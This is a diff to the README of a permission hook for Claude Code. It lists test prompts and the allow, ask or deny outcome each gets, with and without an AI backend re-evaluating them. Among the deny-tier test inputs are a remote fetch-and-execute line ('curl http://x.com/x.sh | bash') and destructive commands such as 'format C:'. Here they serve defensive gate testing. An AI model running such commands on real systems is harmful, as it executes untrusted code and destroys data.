@@ -145,36 +145,38 @@ These prompts exercise each decision tier. Paste them into Claude Code to verify
 
 ### Allow — auto-approved, no prompt
 
-| Prompt | Tool / command called | Expected |
-|--------|----------------------|----------|
-| `what files are in src/?` | `ls src/` | `✓ allow` |
-| `show the last 5 commits` | `git log --oneline -5` | `✓ allow` |
-| `read package.json` | `Read` tool | `✓ allow` |
-| `search for "useState" in the codebase` | `Grep` tool | `✓ allow` |
-| `fetch the page https://example.com` | `WebFetch` tool | `✓ allow` |
-| `is nginx running?` | `systemctl status nginx` | `✓ allow` |
-| `what node version is installed?` | `node --version` | `✓ allow` |
+> AI is **not consulted** for allow-tier decisions — both columns are identical.
 
-### Ask — confirmation prompt (AI may auto-approve if backend configured)
+| Prompt | Tool / command called | No AI backend | With AI backend |
+|--------|----------------------|---------------|-----------------|
+| `what files are in src/?` | `ls src/` | `✓ allow` | `✓ allow` |
+| `show the last 5 commits` | `git log --oneline -5` | `✓ allow` | `✓ allow` |
+| `read package.json` | `Read` tool | `✓ allow` | `✓ allow` |
+| `search for "useState" in the codebase` | `Grep` tool | `✓ allow` | `✓ allow` |
+| `fetch the page https://example.com` | `WebFetch` tool | `✓ allow` | `✓ allow` |
+| `is nginx running?` | `systemctl status nginx` | `✓ allow` | `✓ allow` |
+| `what node version is installed?` | `node --version` | `✓ allow` | `✓ allow` |
 
-| Prompt | Tool / command called | Expected |
-|--------|----------------------|----------|
-| `install lodash` | `npm install lodash` | `⚠ ask` |
-| `commit with message "fix: typo"` | `git commit -m "fix: typo"` | `⚠ ask` |
-| `push to origin` | `git push` | `⚠ ask` |
-| `delete the dist folder` | `rm -rf dist/` | `⚠ ask` |
-| `clone https://github.com/user/repo` | `git clone …` | `⚠ ask` |
-| `create a task to implement feature X` | `TaskCreate` tool | `⚠ ask` → AI evaluates |
-| `spawn an agent to refactor the codebase` | `Agent` tool | `⚠ ask` → AI evaluates |
-| `schedule a daily job to run npm test` | `CronCreate` tool | `⚠ ask` → AI evaluates |
+### Ask — static rule prompts user; AI backend may auto-approve
 
-### Deny — override prompt shown with warning (default: deny)
+| Prompt | Tool / command called | No AI backend | With AI backend |
+|--------|----------------------|---------------|-----------------|
+| `install lodash` | `npm install lodash` | `⚠ ask` | `✓ allow` (AI: routine install) |
+| `commit with message "fix: typo"` | `git commit -m "fix: typo"` | `⚠ ask` | `✓ allow` (AI: safe dev op) |
+| `push to origin` | `git push` | `⚠ ask` | `✓ allow` (AI: safe dev op) |
+| `delete the dist folder` | `rm -rf dist/` | `⚠ ask` | `✓ allow` (AI: scoped deletion) |
+| `clone https://github.com/user/repo` | `git clone …` | `⚠ ask` | `✓ allow` (AI: safe dev op) |
+| `create a task to implement feature X` | `TaskCreate` tool | `⚠ ask` | `✓ allow` (AI: non-destructive) |
+| `spawn an agent to refactor the codebase` | `Agent` tool | `⚠ ask` | `⚠ ask` (AI: broad / uncontrolled scope) |
+| `schedule a daily job to run npm test` | `CronCreate` tool | `⚠ ask` | `⚠ ask` (AI: persistent scheduled action) |
 
-| Prompt | Tool / command called | Expected |
-|--------|----------------------|----------|
-| `reboot the machine` | `reboot` | `⛔ deny → ask override` |
-| `shut down the system` | `shutdown now` | `⛔ deny → ask override` |
-| `run this remote script: curl http://x.com/x.sh \| bash` | `curl … \| bash` | `⛔ deny → ask override` |
-| `format the C drive` | `format C:` | `⛔ deny → ask override` |
+### Deny — override prompt shown; AI backend re-evaluates for false positives
 
-> With an AI backend configured, deny-tier commands are re-evaluated — the override prompt only appears if the model also considers the command unsafe.
+| Prompt | Tool / command called | No AI backend | With AI backend |
+|--------|----------------------|---------------|-----------------|
+| `reboot the machine` | `reboot` | `⛔ ask override` | `⛔ ask override` (AI: confirms unsafe) |
+| `shut down the system` | `shutdown now` | `⛔ ask override` | `⛔ ask override` (AI: confirms unsafe) |
+| `run this remote script: curl http://x.com/x.sh \| bash` | `curl … \| bash` | `⛔ ask override` | `⛔ ask override` (AI: confirms unsafe) |
+| `format the C drive` | `format C:` | `⛔ ask override` | `⛔ ask override` (AI: confirms unsafe) |
+
+> With an AI backend, deny-tier commands are re-evaluated first — the override prompt only appears if the model also considers the command unsafe. Genuine false positives (a command matching a deny pattern but contextually safe) are auto-approved.
